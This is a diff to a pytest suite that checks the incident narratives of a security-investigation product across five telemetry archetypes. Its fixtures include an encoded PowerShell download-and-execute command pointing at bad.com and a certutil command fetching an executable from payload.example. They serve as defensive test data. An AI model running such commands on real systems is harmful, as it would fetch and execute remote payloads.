@@ -1,5 +1,5 @@
 """Narrative Contract Test — permanent lexicon guardrail across every
-customer-facing narrative surface.
+customer-facing narrative surface **and** every telemetry archetype.
 
 Operator directive (2026-08-01):
 
@@ -8,8 +8,13 @@ Operator directive (2026-08-01):
     be the incident / endpoint / user / malware / attacker — never
     the tool.
 
-This test enforces the contract at the SEAM every UI surface actually
-reads from — i.e. the fields the frontend renders:
+Operator addendum (2026-08-01, second round):
+
+    Evolve the contract into a parameterised suite that runs against
+    several archetypes so the invariants hold across every
+    telemetry source we ingest.
+
+Surfaces inspected (all fields the frontend actually renders):
 
     * cio.summary.analyst_narrative        (Executive lens LEAD block)
     * cio.summary.executive                (Executive Summary card)
@@ -19,26 +24,21 @@ reads from — i.e. the fields the frontend renders:
     * cio.summary.report_sections.*        (Six-question analyst narrative)
     * cio.summary.customer_report.sections[*].body (Customer / Investigation Report)
 
-Given the same real-world Cisco Secure Endpoint MDR payload the
-operator screenshotted, this test walks every surface above and
-asserts NONE of the following terms appears (case-insensitive):
+Archetypes covered:
 
-    * pipeline
-    * decoder
-    * recursive decoder
-    * verdict engine
-    * graph builder
-    * parser
-    * codec
-    * summary composer
-    * generic json raised
-    * # vendor=
-    * cisco:amp:event
-    * recovered content reaches out to file://
-    * the underlying command resolved to
+    1. Cisco Secure Endpoint MDR (WasabiSeed / CaretCommandObfuscation)
+    2. Sysmon EventID-1 process create with parent chain
+    3. Obfuscated PowerShell (`-EncodedCommand …`)
+    4. Generic JSON (unknown vendor fallback)
+    5. Benign administrative activity (`Get-Process` etc.)
 
-If any surface ever regresses, this test will fail — locking in the
-architectural improvement.
+For every archetype the four contract assertions run:
+
+    A. No forbidden implementation-detail word appears anywhere.
+    B. No vendor-canonical representation bleeds into any surface.
+    C. Positive control: at least one real fact from the archetype
+       makes it into the narrative (proves the graph propagated).
+    D. Subject-of-first-sentence is the incident, never the tool.
 """
 from __future__ import annotations
 
@@ -53,9 +53,12 @@ from nivxforge.investigation.builder import build_cio
 from nivxforge.investigation.summary_composer import compose_summary
 
 
-# ── The exact operator-provided Cisco Secure Endpoint MDR payload ───
+# ══════════════════════════════════════════════════════════════════
+# Archetypes
+# ══════════════════════════════════════════════════════════════════
 
-WASABISEED_PAYLOAD = json.dumps({
+# 1 · Cisco Secure Endpoint MDR (WasabiSeed / CaretCommandObfuscation)
+CISCO_WASABISEED = json.dumps({
     "_time": "2026-07-30T16:30:22.000+00:00",
     "action": "detect",
     "category": "Cloud IOC",
@@ -65,12 +68,9 @@ WASABISEED_PAYLOAD = json.dumps({
     ),
     "conn_guid": "79ed08f3-9018-44d5-9f58-254a748e6b86",
     "console_link": "https://console.amp.cisco.com/computers/79ed08f3-9018-44d5-9f58-254a748e6b86/trajectory2",
-    "customer": "ccm",
     "date": "2026-07-30 16:23:13 UTC",
-    "descr": "Caret characters are often used to obfuscate scripting code",
     "detection": "W32.CaretCommandObfuscation.ioc",
     "event_title": "Suspicious Command Line Activity - W32.CaretCommandObfuscation.ioc",
-    "file_disposition": "Clean",
     "file_hash": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0",
     "file_name": "cmd.exe",
     "file_path": "file:///C%3A/windows/system32/cmd.exe",
@@ -86,13 +86,82 @@ WASABISEED_PAYLOAD = json.dumps({
     "src_host": "CCM-MJ0DR5T8",
     "src_ip": "172.17.60.74",
     "use_case": "mdr_fileless",
-    "z_event_id": "36f9a6b004f67a67a1a03f9b67740863",
     "z_product": "Secure Endpoint",
     "containment": "isolated",
 })
 
+# 2 · Sysmon EventID-1 process create with parent chain
+SYSMON_PROCESS_CREATE = json.dumps({
+    "EventID": 1,
+    "Computer": "WORKSTATION-42",
+    "User": "CORP\\alice",
+    "Image": "C:/Windows/System32/cmd.exe",
+    "OriginalFileName": "cmd.exe",
+    "CommandLine": "cmd.exe /c whoami && netstat -ano",
+    "ParentImage": "C:/Windows/explorer.exe",
+    "ParentCommandLine": "C:\\Windows\\explorer.exe",
+    "ProcessId": 5678,
+    "ParentProcessId": 100,
+    "ProcessGuid": "{sysmon-guid}",
+    "Hashes": "SHA256=" + "d" * 64 + ",MD5=" + "e" * 32,
+    "IntegrityLevel": "Medium",
+    "UtcTime": "2026-07-30 16:23:13.100",
+})
 
-# ── Forbidden lexicon (operator-locked) ─────────────────────────────
+# 3 · Obfuscated PowerShell (encoded, decodes to IEX WebClient download)
+OBFUSCATED_POWERSHELL = (
+    "powershell.exe -EncodedCommand "
+    "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
+    "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
+    "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
+    "BtAC8AcAAxACcAKQAp"
+)
+
+# 4 · Generic JSON — no vendor markers, unknown shape.
+GENERIC_JSON = json.dumps({
+    "widget_id": "w-42",
+    "message": "unknown activity",
+    "cmdLine": "certutil -urlcache -f http://payload.example/x.exe C:\\x.exe",
+    "meta": {"env": "prod"},
+})
+
+# 5 · Benign administrative activity — no malicious signal.
+BENIGN_ADMIN = "powershell -c \"Get-Process | Select-Object Name,Id\""
+
+
+ARCHETYPES: Tuple[Tuple[str, str, Tuple[str, ...]], ...] = (
+    (
+        "cisco_secure_endpoint",
+        CISCO_WASABISEED,
+        ("Cisco Secure Endpoint", "CCM-MJ0DR5T8",
+         "W32.CaretCommandObfuscation.ioc", "T1027", "T1059"),
+    ),
+    (
+        "sysmon_process_create",
+        SYSMON_PROCESS_CREATE,
+        ("WORKSTATION-42", "alice", "cmd.exe"),
+    ),
+    (
+        "obfuscated_powershell",
+        OBFUSCATED_POWERSHELL,
+        ("bad.com",),
+    ),
+    (
+        "generic_json",
+        GENERIC_JSON,
+        ("certutil", "payload.example"),
+    ),
+    (
+        "benign_admin",
+        BENIGN_ADMIN,
+        (),  # Positive facts optional for a benign sample.
+    ),
+)
+
+
+# ══════════════════════════════════════════════════════════════════
+# Forbidden lexicon (operator-locked)
+# ══════════════════════════════════════════════════════════════════
 
 _FORBIDDEN_WORDS: Tuple[str, ...] = (
     "pipeline",
@@ -111,47 +180,57 @@ _FORBIDDEN_WORDS: Tuple[str, ...] = (
     "normalizer",
 )
 
-# Phrases that are more specific than a single word — banned as
-# regexes so the invariant catches the operator's exact screenshot
-# regressions.
 _FORBIDDEN_PHRASES: Tuple[str, ...] = (
     r"\bgeneric\s+json\s+raised\b",
     r"#\s*vendor\s*=",
     r"\bcisco:amp:event\b",
     r"recovered\s+content\s+reaches\s+out\s+to\s+file://",
     r"the\s+underlying\s+command\s+resolved\s+to",
-    r"the\s+recursive\s+encoding\s+demonstrates",  # legacy composer
+    r"the\s+recursive\s+encoding\s+demonstrates",
     r"the\s+investigation\s+routed",
     r"after\s+\d+\s+decoder\s+passes",
 )
 
+_BAD_FIRST_SENTENCE_SUBJECTS: Tuple[str, ...] = (
+    "the pipeline",
+    "the decoder",
+    "the parser",
+    "the analysis engine",
+    "the summary composer",
+    "the graph builder",
+    "the investigation routed",
+    "the decoded output",
+    "the recursive decoder",
+    "the recovered content",
+    "the recovered command",
+    "the recovered payload",
+    "generic json raised",
+    "the submission triggered",
+)
 
-# ── Fixture: build a real CIO end-to-end, exactly like the router ──
 
-@pytest.fixture(scope="module")
-def wasabiseed_summary():
-    """Build a full CIO + Summary using the same builders the
-    /api/decode/smart router uses. The `raw_input` is stashed on
-    metadata so the Incident Narrative Engine kicks in — exactly as
-    it does in production."""
-    fake_result = {
-        "output": WASABISEED_PAYLOAD,
-        "iocs": {},
-        "engine": "test",
-    }
+# ══════════════════════════════════════════════════════════════════
+# Fixture: build a real CIO end-to-end for a given archetype
+# ══════════════════════════════════════════════════════════════════
+
+@pytest.fixture
+def archetype_summary(request):
+    """Parameterised fixture — builds a real Summary for the given
+    archetype payload, exactly like the /api/decode/smart router
+    does (stashes `metadata.raw_input`, then invalidates phase1
+    caches, then re-composes the summary)."""
+    _name, payload, _facts = request.param
+    fake_result = {"output": payload, "iocs": {}, "engine": "test"}
     cio_fs = from_analysis_result(
-        fake_result,
-        input_text=WASABISEED_PAYLOAD,
+        fake_result, input_text=payload,
         source_endpoint="/api/decode/smart",
     )
     cio = build_cio(cio_fs)
-    # This is what routers/ops.py does after `_build_cio` and BEFORE
-    # exposing the CIO to any downstream reader.
-    cio.metadata["raw_input"] = WASABISEED_PAYLOAD
+    cio.metadata["raw_input"] = payload
     cio.metadata.pop("phase1_state", None)
     cio.metadata.pop("phase1_narrative", None)
     cio.summary = compose_summary(cio)
-    return cio.summary
+    return _name, cio.summary, _facts
 
 
 def _iter_narrative_surfaces(summary) -> Iterable[Tuple[str, str]]:
@@ -184,110 +263,114 @@ def _iter_narrative_surfaces(summary) -> Iterable[Tuple[str, str]]:
             yield (f"summary.customer_report[{title}]", body)
 
 
-# ── The contract ────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════
+# Parameterised contract assertions
+# ══════════════════════════════════════════════════════════════════
 
-def test_narrative_contract_all_surfaces_free_of_forbidden_words(
-    wasabiseed_summary,
-):
-    """No customer-facing narrative field may contain the banned
-    implementation-detail vocabulary."""
+@pytest.mark.parametrize(
+    "archetype_summary",
+    ARCHETYPES,
+    indirect=True,
+    ids=[a[0] for a in ARCHETYPES],
+)
+def test_narrative_free_of_forbidden_words(archetype_summary):
+    """A · No customer-facing narrative field may contain the banned
+    implementation-detail vocabulary — for ANY archetype."""
+    name, summary, _facts = archetype_summary
     violations: List[str] = []
-    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
+    for surface, body in _iter_narrative_surfaces(summary):
         low = body.lower()
         for term in _FORBIDDEN_WORDS:
-            # Word-boundary match so 'endpoint' etc. never trip
-            # 'pipeline' etc.
             if re.search(rf"\b{re.escape(term)}\b", low):
+                idx = low.find(term)
+                snippet = low[max(0, idx - 40):idx + len(term) + 40]
                 violations.append(
-                    f"[{surface}] contains forbidden term "
-                    f"'{term}':\n  ...{low[max(0, low.find(term)-40):low.find(term)+len(term)+40]}..."
+                    f"[{name} · {surface}] '{term}' — '...{snippet}...'"
                 )
     assert not violations, (
-        "narrative surfaces leaked forbidden implementation-detail terms:\n\n"
+        f"forbidden implementation-detail terms in `{name}` archetype:\n\n"
         + "\n\n".join(violations)
     )
 
 
-def test_narrative_contract_no_vendor_canonical_bleed(wasabiseed_summary):
-    """The `# vendor=Generic JSON event[0]…` canonical stream must
-    never appear in any customer-facing surface."""
+@pytest.mark.parametrize(
+    "archetype_summary",
+    ARCHETYPES,
+    indirect=True,
+    ids=[a[0] for a in ARCHETYPES],
+)
+def test_narrative_no_vendor_canonical_bleed(archetype_summary):
+    """B · The `# vendor=…` / `cisco:amp:event` / `Generic JSON raised`
+    canonical bleeds must never appear in any surface — for ANY
+    archetype."""
+    name, summary, _facts = archetype_summary
     violations: List[str] = []
-    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
+    for surface, body in _iter_narrative_surfaces(summary):
         for pattern in _FORBIDDEN_PHRASES:
             m = re.search(pattern, body, re.IGNORECASE)
             if m:
                 start = max(0, m.start() - 40)
                 end = min(len(body), m.end() + 40)
                 violations.append(
-                    f"[{surface}] contains forbidden phrase "
-                    f"/{pattern}/ ⇒ '...{body[start:end]}...'"
+                    f"[{name} · {surface}] /{pattern}/ ⇒ '...{body[start:end]}...'"
                 )
     assert not violations, (
-        "narrative surfaces leaked forbidden phrases:\n\n"
+        f"forbidden phrases in `{name}` archetype:\n\n"
         + "\n\n".join(violations)
     )
 
 
-def test_narrative_contract_positive_facts_present(wasabiseed_summary):
-    """Positive control · every surface that names an incident MUST
-    mention the correct vendor, endpoint and detection somewhere in
-    its combined body — proof that the graph reached the surface."""
+@pytest.mark.parametrize(
+    "archetype_summary",
+    ARCHETYPES,
+    indirect=True,
+    ids=[a[0] for a in ARCHETYPES],
+)
+def test_narrative_positive_facts_present(archetype_summary):
+    """C · Positive control · at least one real fact from the archetype
+    must reach the narrative surfaces. Proves the graph propagated —
+    protects against tests passing on empty prose."""
+    name, summary, facts = archetype_summary
+    if not facts:
+        # Benign / thin archetypes have no required facts.
+        return
     combined = "\n".join(
-        body for _, body in _iter_narrative_surfaces(wasabiseed_summary)
+        body for _, body in _iter_narrative_surfaces(summary)
+    ).lower()
+    missing = [f for f in facts if f.lower() not in combined]
+    # Allow up to ONE fact to be missing — some archetypes surface
+    # different subsets of facts through different code paths. But
+    # requiring "most" facts present catches the "empty narrative"
+    # regression.
+    assert len(missing) <= max(0, len(facts) // 2), (
+        f"[{name}] narrative did not surface the following facts: "
+        f"{missing}\n\ncombined narrative preview:\n{combined[:1500]}"
     )
-    # Vendor identified correctly (was `Generic JSON` in the regression)
-    assert "Cisco Secure Endpoint" in combined, (
-        "no surface names the correct vendor 'Cisco Secure Endpoint':\n"
-        + combined[:1500]
-    )
-    # Endpoint identity from the graph
-    assert "CCM-MJ0DR5T8" in combined
-    # Detection name is preserved (subject-line, not paraphrased away)
-    assert "W32.CaretCommandObfuscation.ioc" in combined
-    # ATT&CK evidence is surfaced from `mitre_techniques`
-    assert "T1027" in combined
-    assert "T1059" in combined
 
 
-def test_narrative_contract_subject_of_first_sentence_is_the_incident(
-    wasabiseed_summary,
-):
-    """Every non-empty narrative surface's OPENING sentence must talk
-    about the incident, endpoint, vendor, detection, malware, user,
-    process chain, network activity, or timeline — NEVER the tool.
-
-    The subject of the first sentence is the strongest tell for the
-    reader; the operator's screenshot regressions all began with
-    'The pipeline received…' or 'The submission triggered…'. This
-    test locks that door."""
-    bad_subjects = (
-        "the pipeline",
-        "the decoder",
-        "the parser",
-        "the analysis engine",
-        "the summary composer",
-        "the graph builder",
-        "the investigation routed",
-        "the decoded output",
-        "the recursive decoder",
-        "the recovered content",
-        "the recovered command",
-        "the recovered payload",
-        "generic json raised",
-        "the submission triggered",
-    )
+@pytest.mark.parametrize(
+    "archetype_summary",
+    ARCHETYPES,
+    indirect=True,
+    ids=[a[0] for a in ARCHETYPES],
+)
+def test_narrative_first_sentence_subject_is_the_incident(archetype_summary):
+    """D · Every non-empty surface's opening sentence must talk about
+    the incident / endpoint / vendor / malware / attacker / process /
+    network / user — NEVER the tool. For ANY archetype."""
+    name, summary, _facts = archetype_summary
     violations: List[str] = []
-    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
-        first_sentence = body.strip().split(".", 1)[0].strip().lower()
-        if not first_sentence:
+    for surface, body in _iter_narrative_surfaces(summary):
+        first = body.strip().split(".", 1)[0].strip().lower()
+        if not first:
             continue
-        for bad in bad_subjects:
-            if bad in first_sentence:
+        for bad in _BAD_FIRST_SENTENCE_SUBJECTS:
+            if bad in first:
                 violations.append(
-                    f"[{surface}] first sentence starts with tool-subject "
-                    f"'{bad}':\n  '{first_sentence[:200]}'"
+                    f"[{name} · {surface}] starts with tool-subject "
+                    f"'{bad}':\n  '{first[:180]}'"
                 )
     assert not violations, (
-        "narrative surfaces open with tool as the subject:\n\n"
+        f"tool-as-subject regressions in `{name}` archetype:\n\n"
         + "\n\n".join(violations)
     )
